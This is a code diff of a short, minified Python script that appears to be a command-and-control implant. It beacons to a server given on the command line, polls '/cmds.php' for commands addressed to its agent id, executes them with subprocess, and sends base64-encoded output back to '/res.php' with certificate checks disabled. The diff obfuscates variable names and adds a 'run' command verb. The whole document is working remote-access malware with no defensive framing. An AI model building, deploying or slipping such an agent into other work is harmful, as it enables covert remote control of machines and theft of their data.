@@ -1,18 +1,21 @@
-V='&id='
-U='/res.php?res='
+X=':'
+W='&id='
+V='/res.php?res='
 J=False
-I=str
-F='ascii'
-import requests as B,base64 as G,sys,time,subprocess as K
+H='ascii'
+G=str
+import requests as B,base64 as I,sys,time,subprocess as K
 A=sys.argv[1]
 C=sys.argv[2]
 L='Hello From Agent '+A+' (Python)'
-M=L.encode(F)
-N=G.b64encode(M)
-O=N.decode(F)
-W=B.get(C+U+O+V+A,verify=J)
+M=L.encode(H)
+N=I.b64encode(M)
+O=N.decode(H)
+Y=B.get(C+V+O+W+A,verify=J)
 while True:
-	D=B.get(C+'/cmds.php?id='+A+'&o=P',verify=J);D=I(D.text)
-	for H in D.splitlines():
-		if I(A)in H:P=I(H.split(':',1)[1]);Q=P.split(' ');E=K.check_output(Q);E=E.decode('utf-8');R=E.encode(F);S=G.b64encode(R);T=S.decode(F);X=B.get(C+U+T+V+A,verify=J)
+	D=B.get(C+'/cmds.php?id='+A+'&o=P',verify=J);D=G(D.text)
+	for E in D.splitlines():
+		if G(A)in E:
+			P=G(E.split(X,2)[1])
+			if P=='run':Q=G(E.split(X,2)[2]);R=Q.split(' ');F=K.check_output(R);F=F.decode('utf-8');S=F.encode(H);T=I.b64encode(S);U=T.decode(H);Z=B.get(C+V+U+W+A,verify=J)
 	time.sleep(10)
